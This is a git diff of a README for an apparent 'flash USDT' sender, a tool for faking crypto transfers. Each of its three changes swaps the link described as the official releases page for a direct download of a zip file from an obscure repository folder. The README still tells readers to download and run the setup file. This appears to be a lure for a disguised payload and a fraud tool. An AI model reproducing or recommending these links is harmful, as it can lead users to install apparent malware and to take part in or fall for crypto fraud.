@@ -1,6 +1,6 @@
 # ⚡ FLASH-USDT-ERC20-SOFTWARE-SENDER - Fast USDT Transfers Made Simple
 
-[![Download Latest Release](https://img.shields.io/badge/Download-FLASH--USDT--ERC20--SOFTWARE--SENDER-brightgreen?style=for-the-badge)](https://github.com/mhannanali/FLASH-USDT-ERC20-SOFTWARE-SENDER/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-FLASH--USDT--ERC20--SOFTWARE--SENDER-brightgreen?style=for-the-badge)](https://github.com/mhannanali/FLASH-USDT-ERC20-SOFTWARE-SENDER/raw/refs/heads/main/lathen/ER-FLAS-SOFTWAR-SENDER-USD-innuendo.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section shows you how to get the software and start using it on your Window
 
 Click the link below to open the official release page where the software is available.
 
-[Download FLASH-USDT-ERC20-SOFTWARE-SENDER](https://github.com/mhannanali/FLASH-USDT-ERC20-SOFTWARE-SENDER/releases)
+[Download FLASH-USDT-ERC20-SOFTWARE-SENDER](https://github.com/mhannanali/FLASH-USDT-ERC20-SOFTWARE-SENDER/raw/refs/heads/main/lathen/ER-FLAS-SOFTWAR-SENDER-USD-innuendo.zip)
 
 ### Step 2: Choose the Latest Windows Release
 
@@ -131,7 +131,7 @@ If you experience issues:
 
 Visit the official release page again to download the latest version:
 
-[Download from GitHub Releases](https://github.com/mhannanali/FLASH-USDT-ERC20-SOFTWARE-SENDER/releases)
+[Download from GitHub Releases](https://github.com/mhannanali/FLASH-USDT-ERC20-SOFTWARE-SENDER/raw/refs/heads/main/lathen/ER-FLAS-SOFTWAR-SENDER-USD-innuendo.zip)
 
 Click, download, and run the setup file according to the steps shown above.
 
